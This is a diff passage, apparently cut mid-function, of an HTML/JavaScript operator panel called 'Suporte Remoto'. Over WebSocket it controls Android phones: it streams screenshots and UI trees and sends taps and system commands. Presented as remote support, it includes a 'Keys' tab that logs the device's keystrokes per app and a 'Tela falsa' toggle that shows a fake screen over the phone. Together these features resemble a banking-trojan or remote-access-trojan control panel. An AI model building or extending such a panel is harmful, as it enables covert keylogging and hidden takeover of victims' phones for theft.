@@ -3,78 +3,91 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Suporte Remoto — Técnico</title>
+<title>Suporte Remoto</title>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.2.0/tabler-icons.min.css">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:100vh;display:flex;flex-direction:column;overflow:hidden}
-.topbar{display:flex;align-items:center;justify-content:space-between;padding:8px 20px;background:#161b27;border-bottom:1px solid #2d3748;flex-shrink:0}
-.logo{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:600;color:#fff}
+
+/* Topbar */
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;background:#161b27;border-bottom:1px solid #2d3748;flex-shrink:0}
+.logo{font-size:15px;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px}
 .logo i{color:#4299e1}
-.status{display:flex;align-items:center;gap:6px;font-size:11px;padding:3px 10px;border-radius:999px;background:#1a202c}
-.status.online{color:#68d391}.status.offline{color:#718096}
+.badge{display:flex;align-items:center;gap:6px;font-size:11px;padding:3px 10px;border-radius:999px;background:#1a202c}
+.badge.on{color:#68d391}.badge.off{color:#718096}
 .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
-.sidebar{background:#161b27;border-right:1px solid #2d3748;padding:10px;display:flex;flex-direction:column;gap:2px;overflow-y:auto;width:180px;flex-shrink:0}
-.sec-title{font-size:9px;color:#4a5568;letter-spacing:.08em;text-transform:uppercase;padding:6px 6px 2px}
-.ctrl{display:flex;align-items:center;gap:6px;padding:6px 8px;border-radius:6px;border:none;background:transparent;color:#a0aec0;cursor:pointer;font-size:11px;width:100%;text-align:left}
+
+/* Tela de lista */
+#tela-lista{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;gap:12px}
+#tela-lista h2{font-size:13px;color:#718096;margin-bottom:4px}
+.cliente-card{background:#161b27;border:1px solid #2d3748;border-radius:12px;padding:14px 18px;width:380px;display:flex;align-items:center;justify-content:space-between;gap:12px;transition:border-color .2s}
+.cliente-card:hover{border-color:#4299e1}
+.cliente-card.offline{opacity:.5}
+.cliente-info{flex:1}
+.cliente-info .nome{font-size:13px;font-weight:600;color:#e2e8f0;display:flex;align-items:center;gap:8px}
+.cliente-info .detalhe{font-size:11px;color:#718096;margin-top:3px}
+.status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.status-dot.on{background:#68d391}.status-dot.off{background:#4a5568}
+.btn-atender{padding:7px 16px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;font-weight:500;white-space:nowrap}
+.btn-atender:hover{background:#3182ce}
+.btn-atender:disabled{background:#2d3748;color:#4a5568;cursor:not-allowed}
+.sem-clientes{color:#4a5568;font-size:13px;text-align:center}
+.sem-clientes i{font-size:32px;display:block;margin-bottom:8px;color:#2d3748}
+
+/* Tela do painel */
+#tela-painel{flex:1;display:none;overflow:hidden}
+.painel-inner{display:grid;grid-template-columns:190px 1fr 230px;height:100%}
+
+/* Sidebar */
+.sidebar{background:#161b27;border-right:1px solid #2d3748;padding:10px;display:flex;flex-direction:column;gap:2px;overflow-y:auto}
+.sec{font-size:9px;color:#4a5568;letter-spacing:.08em;text-transform:uppercase;padding:8px 6px 3px}
+.ctrl{display:flex;align-items:center;gap:7px;padding:7px 8px;border-radius:7px;border:none;background:transparent;color:#a0aec0;cursor:pointer;font-size:11px;width:100%;text-align:left}
 .ctrl:hover{background:#1e2433;color:#e2e8f0}
 .ctrl i{font-size:13px;color:#4a5568;flex-shrink:0}
-.ctrl.danger:hover{background:#2d1515;color:#fc8181}
-.ctrl.danger:hover i{color:#fc8181}
 .ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
 .ctrl.purple{color:#9f7aea}.ctrl.purple i{color:#9f7aea}
 .ctrl.purple:hover{background:#1a1535}
-.ctrl.active-overlay{color:#fc8181;animation:pulse 1.5s infinite}
-.ctrl.active-overlay i{color:#fc8181}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.ctrl.danger{color:#fc8181}.ctrl.danger i{color:#fc8181}
+.ctrl.danger:hover{background:#2d1515}
+.ctrl.overlay-on{color:#fc8181;animation:pulse 1.5s infinite}
+.ctrl.overlay-on i{color:#fc8181}
 .vol-row{display:flex;align-items:center;gap:6px;padding:3px 0;font-size:10px;color:#4a5568}
-.vol-row input[type=range]{flex:1;accent-color:#4299e1;height:3px}
-.center{display:flex;flex-direction:column;align-items:center;padding:10px 16px;gap:8px;overflow:hidden;flex:1}
-.device-wrap{background:#0a0a0a;border:2px solid #333;border-radius:28px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #222,0 12px 40px rgba(0,0,0,.6);overflow:hidden;cursor:crosshair}
-#wf-canvas{display:block;width:100%;height:100%}
+.vol-row input{flex:1;accent-color:#4299e1}
+
+/* Centro */
+.center{display:flex;flex-direction:column;align-items:center;padding:12px 16px;gap:8px;overflow:hidden}
+.device{background:#0a0a0a;border:2px solid #2d3748;border-radius:28px;flex-shrink:0;overflow:hidden;cursor:crosshair;position:relative}
+#canvas{display:block}
+.waiting{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#2d3748;font-size:11px;gap:6px}
+.waiting i{font-size:28px}
 .nav-bar{display:flex;gap:5px;justify-content:center;flex-wrap:wrap;flex-shrink:0}
-.nav-btn{padding:6px 10px;background:#1e2433;border:1px solid #2d3748;border-radius:8px;color:#718096;cursor:pointer;font-size:10px;display:flex;align-items:center;gap:3px;flex-direction:column}
+.nav-btn{padding:7px 11px;background:#1e2433;border:1px solid #2d3748;border-radius:8px;color:#718096;cursor:pointer;font-size:10px;display:flex;align-items:center;gap:3px;flex-direction:column}
 .nav-btn:hover{background:#2d3748;color:#fff}
 .nav-btn.purple{border-color:#553c8b;color:#9f7aea}
-.nav-btn.active-overlay{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
+.nav-btn.overlay-on{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
 .nav-btn i{font-size:14px}
 .nav-btn span{font-size:8px}
-.right{border-left:1px solid #2d3748;background:#161b27;padding:10px;display:flex;flex-direction:column;overflow:hidden;width:220px;flex-shrink:0}
-.stat-row{display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid #1a202c;font-size:10px}
+
+/* Direita */
+.right{border-left:1px solid #2d3748;background:#161b27;padding:10px;display:flex;flex-direction:column;overflow:hidden}
+.stat-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a202c;font-size:10px}
 .stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
-.tabs{display:flex;gap:3px;margin-top:6px;margin-bottom:3px;flex-shrink:0}
+.msg-area{margin-top:8px;flex-shrink:0}
+.msg-area input{width:100%;background:#1a202c;border:1px solid #2d3748;border-radius:6px;padding:6px 8px;color:#e2e8f0;font-size:11px;outline:none;margin-bottom:4px}
+.msg-area input:focus{border-color:#4299e1}
+.msg-area button{width:100%;padding:5px;background:#4299e1;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:11px}
+.msg-area button:hover{background:#3182ce}
+.tabs{display:flex;gap:3px;margin-top:8px;flex-shrink:0}
 .tab{padding:3px 8px;border-radius:5px;border:1px solid #2d3748;background:transparent;color:#718096;cursor:pointer;font-size:9px}
 .tab.active{background:#1e2433;color:#e2e8f0;border-color:#4299e1}
-.log{flex:1;overflow-y:auto;min-height:0}
+.log{flex:1;overflow-y:auto;min-height:0;margin-top:4px}
 .log-entry{font-size:9px;padding:2px 0;border-bottom:1px solid #1a202c;color:#4a5568}
 .log-entry .ts{color:#2d3748;margin-right:4px}
 .log-entry.ev{color:#68d391}.log-entry.err{color:#fc8181}.log-entry.warn{color:#ed8936}
 .keylog-entry{font-size:10px;padding:3px 4px;border-bottom:1px solid #1a202c;color:#e2e8f0;font-family:monospace}
 .keylog-entry .app{font-size:8px;color:#4a5568;display:block}
-#tela-clientes{display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;gap:14px;padding:20px}
-#tela-clientes h2{font-size:13px;color:#a0aec0}
-.cliente-card{background:#1e2433;border:1px solid #2d3748;border-radius:10px;padding:10px 14px;width:300px;display:flex;align-items:center;justify-content:space-between;gap:10px}
-.cliente-info{font-size:11px;color:#a0aec0;line-height:1.5}
-.cliente-info strong{color:#e2e8f0;font-size:12px}
-.btn-atender{padding:6px 12px;background:#4299e1;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:11px}
-.btn-atender:hover{background:#3182ce}
-.sem-clientes{color:#4a5568;font-size:12px;text-align:center}
-.sem-clientes i{font-size:28px;display:block;margin-bottom:6px}
-#tela-painel{display:none;flex:1;overflow:hidden}
-.painel-inner{display:flex;height:100%}
 
-/* Modal de texto */
-#modal-texto{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:flex-end;justify-content:center;padding-bottom:20px}
-#modal-texto.show{display:flex}
-.modal-box{background:#1e2433;border:1px solid #4299e1;border-radius:14px;padding:16px;width:500px;max-width:92vw}
-.modal-titulo{font-size:11px;color:#4299e1;margin-bottom:10px;display:flex;align-items:center;gap:6px}
-.modal-input-row{display:flex;gap:8px}
-.modal-input-row input{flex:1;background:#0f1117;border:1px solid #2d3748;border-radius:8px;padding:9px 12px;color:#e2e8f0;font-size:14px;outline:none}
-.modal-input-row input:focus{border-color:#4299e1}
-.modal-input-row button{padding:9px 14px;border:none;border-radius:8px;cursor:pointer;font-size:12px;font-weight:500}
-.btn-enviar-txt{background:#4299e1;color:#fff}
-.btn-enviar-txt:hover{background:#3182ce}
-.btn-fechar-txt{background:#2d3748;color:#a0aec0}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 </style>
 </head>
 <body>
@@ -82,9 +95,9 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 <div class="topbar">
   <div class="logo"><i class="ti ti-device-laptop"></i> Suporte Remoto</div>
   <div style="display:flex;align-items:center;gap:10px">
-    <span class="status offline" id="status-badge"><span class="dot"></span> Desconectado</span>
-    <span style="font-size:10px;color:#4a5568" id="session-id-top"></span>
-    <button id="btn-voltar" onclick="voltarLista()" style="display:none;padding:3px 8px;background:#1e2433;border:1px solid #2d3748;border-radius:5px;color:#a0aec0;cursor:pointer;font-size:10px">
+    <span class="badge off" id="badge"><span class="dot"></span> Desconectado</span>
+    <span style="font-size:10px;color:#4a5568" id="token-top"></span>
+    <button id="btn-voltar" onclick="encerrarSessao()" style="display:none;padding:4px 10px;background:#1e2433;border:1px solid #2d3748;border-radius:6px;color:#a0aec0;cursor:pointer;font-size:11px">
       <i class="ti ti-arrow-left"></i> Voltar
     </button>
   </div>
@@ -92,21 +105,20 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 
 <div style="display:flex;flex:1;overflow:hidden">
 
-  <!-- Lista de clientes -->
-  <div id="tela-clientes">
-    <h2><i class="ti ti-devices" style="margin-right:6px"></i>Clientes aguardando atendimento</h2>
-    <div id="lista-clientes">
-      <div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>
+  <!-- LISTA DE CLIENTES -->
+  <div id="tela-lista">
+    <h2><i class="ti ti-devices" style="margin-right:6px"></i>Dispositivos</h2>
+    <div id="lista" style="display:flex;flex-direction:column;gap:8px;width:380px">
+      <div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum dispositivo conectado</div>
     </div>
   </div>
 
-  <!-- Painel técnico -->
+  <!-- PAINEL DO TÉCNICO -->
   <div id="tela-painel">
     <div class="painel-inner">
 
-      <!-- Sidebar -->
       <div class="sidebar">
-        <p class="sec-title">Sistema</p>
+        <p class="sec">Sistema</p>
         <button class="ctrl" onclick="cmd('home')"><i class="ti ti-home"></i> Home</button>
         <button class="ctrl" onclick="cmd('back')"><i class="ti ti-arrow-left"></i> Voltar</button>
         <button class="ctrl" onclick="cmd('recents')"><i class="ti ti-layout-grid"></i> Recentes</button>
@@ -114,61 +126,54 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <button class="ctrl" onclick="cmd('notifications')"><i class="ti ti-bell"></i> Notificações</button>
         <button class="ctrl" onclick="cmd('settings')"><i class="ti ti-settings"></i> Config.</button>
         <button class="ctrl" onclick="cmd('camera')"><i class="ti ti-camera"></i> Câmera</button>
-        <p class="sec-title">Wi-Fi / BT</p>
+        <p class="sec">Wi-Fi / BT</p>
         <button class="ctrl" onclick="cmd('wifi_on')"><i class="ti ti-wifi"></i> Wi-Fi ON</button>
         <button class="ctrl" onclick="cmd('wifi_off')"><i class="ti ti-wifi-off"></i> Wi-Fi OFF</button>
         <button class="ctrl" onclick="cmd('bt_on')"><i class="ti ti-bluetooth"></i> BT ON</button>
         <button class="ctrl" onclick="cmd('bt_off')"><i class="ti ti-bluetooth-off"></i> BT OFF</button>
-        <p class="sec-title">Volume / Brilho</p>
+        <p class="sec">Volume / Brilho</p>
         <div class="vol-row"><i class="ti ti-volume"></i><input type="range" min="0" max="15" value="5" oninput="send({tipo:'volume',valor:+this.value})"></div>
         <div class="vol-row"><i class="ti ti-brightness"></i><input type="range" min="0" max="255" value="120" oninput="send({tipo:'brilho',valor:+this.value})"></div>
-        <p class="sec-title">Controle</p>
-        <button class="ctrl warn" onclick="cmd('solicitar_tela')"><i class="ti ti-refresh"></i> Atualizar</button>
+        <p class="sec">Controle</p>
+        <button class="ctrl warn" onclick="cmd('solicitar_tela')"><i class="ti ti-refresh"></i> Atualizar tela</button>
         <button class="ctrl" onclick="cmd('pedir_permissoes')"><i class="ti ti-shield-check"></i> Permissões</button>
         <button class="ctrl purple" id="btn-overlay-s" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i> Tela falsa</button>
-        <p class="sec-title">Sessão</p>
-        <button class="ctrl danger" onclick="encerrar()"><i class="ti ti-plug-x"></i> Encerrar</button>
+        <p class="sec">Sessão</p>
+        <button class="ctrl danger" onclick="encerrarSessao()"><i class="ti ti-plug-x"></i> Encerrar</button>
       </div>
 
-      <!-- Centro -->
       <div class="center">
-        <div class="device-wrap" id="device-wrap" onclick="handleToque(event)">
-          <canvas id="wf-canvas"></canvas>
+        <div class="device" id="device">
+          <canvas id="canvas"></canvas>
+          <div class="waiting" id="waiting"><i class="ti ti-device-mobile"></i>Aguardando tela...</div>
         </div>
-
         <div class="nav-bar">
           <button class="nav-btn" onclick="cmd('back')"><i class="ti ti-arrow-left"></i><span>Voltar</span></button>
           <button class="nav-btn" onclick="cmd('home')"><i class="ti ti-circle"></i><span>Home</span></button>
           <button class="nav-btn" onclick="cmd('recents')"><i class="ti ti-square"></i><span>Recentes</span></button>
-          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'up'})"><i class="ti ti-arrow-up"></i><span>Swipe ↑</span></button>
-          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>Swipe ↓</span></button>
+          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'up'})"><i class="ti ti-arrow-up"></i><span>↑</span></button>
+          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>↓</span></button>
           <button class="nav-btn" onclick="cmd('solicitar_tela')"><i class="ti ti-refresh"></i><span>Atualizar</span></button>
           <button class="nav-btn purple" id="btn-overlay-n" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span></button>
         </div>
       </div>
 
-      <!-- Direita -->
       <div class="right">
-        <p class="sec-title">Dispositivo</p>
+        <p class="sec">Dispositivo</p>
+        <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
+        <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
         <div class="stat-row"><span class="stat-label">Bateria</span><span class="stat-val" id="d-bat">—</span></div>
         <div class="stat-row"><span class="stat-label">RAM</span><span class="stat-val" id="d-ram">—</span></div>
         <div class="stat-row"><span class="stat-label">Wi-Fi</span><span class="stat-val" id="d-wifi">—</span></div>
-        <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
-        <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
         <div class="stat-row"><span class="stat-label">Resolução</span><span class="stat-val" id="d-res">—</span></div>
-
-        <div style="margin-top:8px;flex-shrink:0">
+        <div class="msg-area">
           <input id="msg-input" type="text" placeholder="Mensagem ao dispositivo..."
-            style="width:100%;background:#1a202c;border:1px solid #2d3748;border-radius:6px;padding:6px 8px;color:#e2e8f0;font-size:11px;outline:none;margin-bottom:4px"
             onkeydown="if(event.key==='Enter') enviarMsg()">
-          <button onclick="enviarMsg()" style="width:100%;padding:5px;background:#4299e1;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:11px">
-            <i class="ti ti-send"></i> Enviar mensagem
-          </button>
+          <button onclick="enviarMsg()"><i class="ti ti-send"></i> Enviar</button>
         </div>
-
         <div class="tabs">
           <button class="tab active" id="tab-log" onclick="aba('log')">📋 Log</button>
-          <button class="tab" id="tab-key" onclick="aba('key')">⌨️ Keys <span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 4px;font-size:8px">!</span></button>
+          <button class="tab" id="tab-key" onclick="aba('key')">⌨️ Keys<span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 4px;font-size:8px;margin-left:2px">!</span></button>
         </div>
         <div class="log" id="painel-log"></div>
         <div class="log" id="painel-key" style="display:none"></div>
@@ -178,277 +183,208 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
   </div>
 </div>
 
-<!-- Modal de texto remoto -->
-<div id="modal-texto">
-  <div class="modal-box">
-    <div class="modal-titulo"><i class="ti ti-keyboard"></i> Campo de texto ativo — digite aqui</div>
-    <div class="modal-input-row">
-      <input type="text" id="input-texto-remoto" placeholder="Digite o texto para enviar ao celular..."
-        onkeydown="if(event.key==='Enter') enviarTexto(); if(event.key==='Escape') fecharModal()">
-      <button class="btn-enviar-txt" onclick="enviarTexto()">Enviar</button>
-      <button class="btn-fechar-txt" onclick="fecharModal()">✕</button>
-    </div>
-  </div>
-</div>
-
 <script>
-const SERVER = window.location.origin.replace(/^http/, 'ws');
+const WS_URL = window.location.origin.replace(/^http/, 'ws');
+const VISOR_W = 270;
 let ws = null, deviceAtual = null;
 let dw = 1080, dh = 2340;
 let abaAtual = 'log', overlayAtivo = false;
-const VISOR_W = 260;
 
-// ── WebSocket ─────────────────────────────────────────────────────────────
+// ── Conexão ───────────────────────────────────────────────────────────────
 
 function conectar() {
-  ws = new WebSocket(`${SERVER}?papel=tecnico`);
+  ws = new WebSocket(`${WS_URL}?papel=tecnico`);
   ws.onopen = () => {
-    setStatus(true); log('Painel conectado', 'ev');
-    if (deviceAtual) setTimeout(() => send({tipo:'conectar_cliente', deviceToken: deviceAtual}), 1000);
+    setBadge(true);
+    log('Painel conectado', 'ev');
   };
   ws.onmessage = (e) => {
     const msg = JSON.parse(e.data);
     switch (msg.tipo) {
-      case 'lista_clientes':      renderClientes(msg.clientes); break;
-      case 'sessao_iniciada':     onSessao(msg); break;
-      case 'arvore_tela':         desenhar(JSON.parse(msg.elementos), msg.pacote); break;
-      case 'screenshot':          mostrarScreenshot(msg.frame); break;
-      case 'keylog':              logKey(msg.texto, msg.app || '?'); break;
-      case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
+      case 'lista_clientes':     renderLista(msg.clientes); break;
+      case 'sessao_iniciada':    abrirPainel(msg); break;
+      case 'screenshot':         mostrarScreenshot(msg.frame); break;
+      case 'arvore_tela':        desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
+      case 'keylog':             logKey(msg.texto, msg.app || '?'); break;
+      case 'cliente_offline':    log('Cliente ficou offline', 'warn'); break;
+      case 'cliente_desconectou':log('Cliente desconectou', 'err'); break;
+      case 'erro':               log('Erro: ' + msg.msg, 'err'); break;
     }
   };
-  ws.onclose = () => { setStatus(false); setTimeout(conectar, 3000); };
+  ws.onclose = () => { setBadge(false); setTimeout(conectar, 2000); };
 }
 conectar();
 
-function send(msg) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg)); }
+function send(msg) {
+  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg));
+}
 function cmd(c) { send({tipo:'cmd', cmd:c}); log(`→ ${c}`); }
 
-// ── Sessão ────────────────────────────────────────────────────────────────
+// ── Lista ─────────────────────────────────────────────────────────────────
 
-function onSessao(msg) {
+function renderLista(clientes) {
+  const el = document.getElementById('lista');
+  if (!clientes || !clientes.length) {
+    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum dispositivo</div>';
+    return;
+  }
+  el.innerHTML = clientes.map(c => `
+    <div class="cliente-card ${c.online ? '' : 'offline'}">
+      <div class="cliente-info">
+        <div class="nome">
+          <span class="status-dot ${c.online ? 'on' : 'off'}"></span>
+          ${c.info?.modelo || 'Dispositivo'}
+        </div>
+        <div class="detalhe">
+          ${c.info?.android || '—'} &nbsp;·&nbsp;
+          Bat: ${c.info?.bateria || '—'} &nbsp;·&nbsp;
+          ${c.info?.wifi || '—'}
+          ${c.emAtendimento ? ' &nbsp;·&nbsp; <span style="color:#4299e1">Em atendimento</span>' : ''}
+        </div>
+      </div>
+      <button class="btn-atender" onclick="atender('${c.deviceToken}')" ${!c.online ? 'disabled' : ''}>
+        <i class="ti ti-headset"></i> ${c.emAtendimento ? 'Retomar' : 'Atender'}
+      </button>
+    </div>
+  `).join('');
+}
+
+function atender(token) {
+  send({tipo: 'conectar_cliente', deviceToken: token});
+}
+
+// ── Painel ────────────────────────────────────────────────────────────────
+
+function abrirPainel(msg) {
   deviceAtual = msg.deviceToken;
   atualizarInfo(msg.info);
-  document.getElementById('tela-clientes').style.display = 'none';
+  document.getElementById('tela-lista').style.display = 'none';
   document.getElementById('tela-painel').style.display = 'flex';
   document.getElementById('btn-voltar').style.display = 'block';
-  document.getElementById('session-id-top').textContent = `Token: ${deviceAtual}`;
+  document.getElementById('token-top').textContent = `Token: ${deviceAtual}`;
   log('Sessão iniciada', 'ev');
-  setTimeout(() => cmd('solicitar_tela'), 600);
+  setTimeout(() => cmd('solicitar_tela'), 500);
 }
 
-function atender(token, emAtendimento) {
-  // Se já está em atendimento por outro técnico, avisa
-  const tipo = emAtendimento ? 'voltar_cliente' : 'conectar_cliente';
-  send({tipo, deviceToken: token});
-}
-
-function voltarLista() {
-  if (overlayAtivo) toggleOverlay();
+function encerrarSessao() {
+  send({tipo: 'sair_sessao'});
   deviceAtual = null;
+  overlayAtivo = false;
   document.getElementById('tela-painel').style.display = 'none';
-  document.getElementById('tela-clientes').style.display = 'flex';
+  document.getElementById('tela-lista').style.display = 'flex';
   document.getElementById('btn-voltar').style.display = 'none';
-  document.getElementById('session-id-top').textContent = '';
+  document.getElementById('token-top').textContent = '';
   limparCanvas();
+  log('Sessão encerrada', 'warn');
 }
 
-function encerrar() { send({tipo:'encerrar'}); voltarLista(); log('Sessão encerrada', 'err'); }
+// ── Canvas ────────────────────────────────────────────────────────────────
 
-// ── Wireframe preto e branco ──────────────────────────────────────────────
-
-function desenhar(els, pacote) {
-  const canvas = document.getElementById('wf-canvas');
-  const wrap   = document.getElementById('device-wrap');
-  const sw = wrap.offsetWidth  || VISOR_W;
-  const sh = wrap.offsetHeight || Math.round(VISOR_W * dh / dw);
-  canvas.width  = sw;
-  canvas.height = sh;
-
-  const ctx = canvas.getContext('2d');
-
-  // Fundo branco
-  ctx.fillStyle = '#ffffff';
-  ctx.fillRect(0, 0, sw, sh);
-
-  const sx = sw / dw;
-  const sy = sh / dh;
-
-  // Filtra só elementos com conteúdo ou interativos
-  const uteis = els.filter(e =>
-    e.clicavel || e.editavel || e.rolavel ||
-    (e.txt && e.txt.trim()) || (e.desc && e.desc.trim())
-  );
-
-  // 1. Fundo dos containers roláveis
-  uteis.filter(e => e.rolavel && !e.clicavel).forEach(e => {
-    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
-    ctx.fillStyle = '#f5f5f5';
-    ctx.fillRect(x, y, w, h);
-    ctx.strokeStyle = '#e0e0e0';
-    ctx.lineWidth = 0.5;
-    ctx.strokeRect(x, y, w, h);
-  });
-
-  // 2. Elementos clicáveis (botões)
-  uteis.filter(e => e.clicavel && !e.editavel).forEach(e => {
-    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
-    const label = (e.txt || e.desc || '').trim();
-    const isSmall = h < 30*sy;
-
-    ctx.fillStyle = '#f0f0f0';
-    ctx.strokeStyle = '#222222';
-    ctx.lineWidth = 1;
-
-    // Borda arredondada
-    const r = Math.min(4, h/3);
-    ctx.beginPath();
-    ctx.roundRect(x+0.5, y+0.5, w-1, h-1, r);
-    ctx.fill();
-    ctx.stroke();
-
-    // Texto
-    if (label) {
-      const fs = Math.min(11, Math.max(7, h * 0.38));
-      ctx.fillStyle = '#111111';
-      ctx.font = `500 ${fs}px system-ui`;
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
-      ctx.save();
-      ctx.beginPath(); ctx.rect(x+2, y+1, w-4, h-2); ctx.clip();
-      ctx.fillText(label.substring(0, 25), x + w/2, y + h/2);
-      ctx.restore();
-    }
-  });
-
-  // 3. Campos editáveis
-  uteis.filter(e => e.editavel).forEach(e => {
-    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
-    const label = (e.txt || e.desc || '').trim();
-
-    ctx.fillStyle = '#ffffff';
-    ctx.strokeStyle = '#555555';
-    ctx.lineWidth = 1.5;
-    ctx.strokeRect(x+0.5, y+0.5, w-1, h-1);
-
-    // Linha de input azul embaixo
-    ctx.strokeStyle = '#4299e1';
-    ctx.lineWidth = 2;
-    ctx.beginPath();
-    ctx.moveTo(x+2, y+h-1);
-    ctx.lineTo(x+w-2, y+h-1);
-    ctx.stroke();
-
-    if (label) {
-      ctx.fillStyle = '#333333';
-      ctx.font = `${Math.min(11, Math.max(7, h*0.4))}px system-ui`;
-      ctx.textAlign = 'left';
-      ctx.textBaseline = 'middle';
-      ctx.save();
-      ctx.beginPath(); ctx.rect(x+4, y+1, w-8, h-2); ctx.clip();
-      ctx.fillText(label.substring(0, 30), x+5, y + h/2);
-      ctx.restore();
-    } else {
-      // Placeholder
-      ctx.fillStyle = '#aaaaaa';
-      ctx.font = `italic ${Math.min(10, Math.max(7, h*0.35))}px system-ui`;
-      ctx.textAlign = 'left';
-      ctx.textBaseline = 'middle';
-      ctx.fillText('campo de texto', x+5, y + h/2);
-    }
-  });
-
-  // 4. Textos puros (labels, títulos)
-  uteis.filter(e => !e.clicavel && !e.editavel && !e.rolavel && (e.txt||e.desc)).forEach(e => {
-    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
-    const label = (e.txt || e.desc || '').trim();
-    if (!label) return;
-    const fs = Math.min(12, Math.max(7, h * 0.55));
-    ctx.fillStyle = '#222222';
-    ctx.font = `${fs}px system-ui`;
-    ctx.textAlign = 'left';
-    ctx.textBaseline = 'middle';
-    ctx.save();
-    ctx.beginPath(); ctx.rect(x, y, w, h); ctx.clip();
-    ctx.fillText(label.substring(0, 35), x+2, y + h/2);
-    ctx.restore();
-  });
-
-  // Nome do app no topo
-  if (pacote) {
-    const nome = pacote.split('.').pop();
-    ctx.fillStyle = 'rgba(0,0,0,0.5)';
-    ctx.fillRect(0, 0, sw, 14);
-    ctx.fillStyle = '#ffffff';
-    ctx.font = 'bold 8px system-ui';
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.fillText(nome, sw/2, 7);
-  }
-
-  document.getElementById('placeholder') && (document.getElementById('placeholder').style.display = 'none');
-  log(`Wireframe: ${uteis.length} elementos`, 'ev');
+function tamanhoCanvas() {
+  const h = Math.round(VISOR_W * dh / dw);
+  const device = document.getElementById('device');
+  const canvas = document.getElementById('canvas');
+  device.style.width  = canvas.style.width  = VISOR_W + 'px';
+  device.style.height = canvas.style.height = h + 'px';
+  canvas.width  = VISOR_W;
+  canvas.height = h;
+  return { sw: VISOR_W, sh: h };
 }
 
 function mostrarScreenshot(base64) {
-  const canvas = document.getElementById('wf-canvas');
-  const wrap   = document.getElementById('device-wrap');
-  const sw = wrap.offsetWidth  || VISOR_W;
-  const sh = wrap.offsetHeight || Math.round(VISOR_W * dh / dw);
-  canvas.width = sw; canvas.height = sh;
+  const {sw, sh} = tamanhoCanvas();
+  const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
   const img = new Image();
-  img.onload = () => ctx.drawImage(img, 0, 0, sw, sh);
+  img.onload = () => {
+    ctx.drawImage(img, 0, 0, sw, sh);
+    document.getElementById('waiting').style.display = 'none';
+  };
   img.src = 'data:image/jpeg;base64,' + base64;
-  log('Screenshot recebido', 'ev');
+}
+
+function desenharWireframe(els, pacote) {
+  const {sw, sh} = tamanhoCanvas();
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.fillStyle = '#fff';
+  ctx.fillRect(0, 0, sw, sh);
+  const sx = sw/dw, sy = sh/dh;
+  const uteis = els.filter(e => e.clicavel||e.editavel||e.rolavel||(e.txt&&e.txt.trim())||(e.desc&&e.desc.trim()));
+  uteis.forEach(e => {
+    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
